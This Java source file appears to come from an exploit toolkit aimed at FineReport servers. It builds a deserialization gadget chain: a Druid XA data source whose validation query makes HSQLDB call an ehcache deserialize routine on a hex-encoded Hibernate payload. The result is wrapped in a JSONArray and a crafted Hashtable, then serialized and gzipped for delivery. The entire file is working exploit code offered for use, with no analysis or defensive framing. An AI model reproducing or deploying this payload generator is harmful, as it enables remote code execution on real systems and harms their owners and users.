package com.h2tg.frchannel.gadget;

import com.fr.json.JSONArray;
import com.fr.third.alibaba.druid.pool.xa.DruidXADataSource;
import org.apache.commons.codec.binary.Hex;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Hashtable;

import static com.h2tg.frchannel.Reflections.*;
import static com.h2tg.frchannel.gadget.HSqlJNDI.makeTextAndMnemonicHashMap;

public class HSqlDeserialize
{
    public static byte[] getPayload(byte[] bytes) throws Exception {
        String url = "jdbc:hsqldb:mem:test";
        byte[]  bytes2 = GzipUncompress(Hibernate.getPayload(bytes));
        String hex = Hex.encodeHexString(bytes2);

        String query = "CALL \"org.terracotta.modules.ehcache.collections.SerializationHelper.deserialize\"(X'"+hex+"');";
        DruidXADataSource druidXADataSource = new DruidXADataSource();
        druidXADataSource.setLogWriter(null);
        druidXADataSource.setInitialSize(1);
        druidXADataSource.setUrl(url);
        druidXADataSource.setValidationQuery(query);

        // 防止NotSerializableException
        setFieldValue(druidXADataSource, "statLogger", null);
        setFieldValue(druidXADataSource, "initedLatch", null);
        setFieldValue(druidXADataSource, "transactionHistogram", null);

        JSONArray jsonArray = new JSONArray(new ArrayList<>(Arrays.asList(druidXADataSource)));

        Hashtable hashtable = makeTextAndMnemonicHashMap(jsonArray);

        byte[] ser= serialize(hashtable);
//        deserialize(ser);
        return GzipCompress(ser);
    }

}
